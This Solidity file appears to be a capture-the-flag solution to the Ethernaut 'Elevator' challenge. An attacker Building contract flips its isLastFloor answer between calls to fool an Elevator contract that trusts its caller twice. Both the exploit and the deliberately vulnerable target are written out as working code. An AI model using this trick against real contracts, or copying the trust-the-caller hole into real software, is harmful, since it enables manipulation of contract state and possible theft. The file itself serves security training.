// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Building {

 elevatorI public elevator;
 bool public  toggle = true;
 
constructor(address _elevator){
    elevator = elevatorI (_elevator);
}
      
    function isLastFloor(uint256 _flor) external  returns (bool){
      toggle = !toggle;
        return toggle;
}

    
    function start(uint256 _floor) public {

        elevator.goTo(_floor);
    }
}

interface elevatorI {
    function goTo(uint256 _floor) external;
}

// interface Building {
//     function isLastFloor(uint256) external returns (bool);
// }

contract Elevator {
    bool public top;
    uint256 public floor;
    function goTo(uint256 _floor) public {
      Building  building  = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }

}
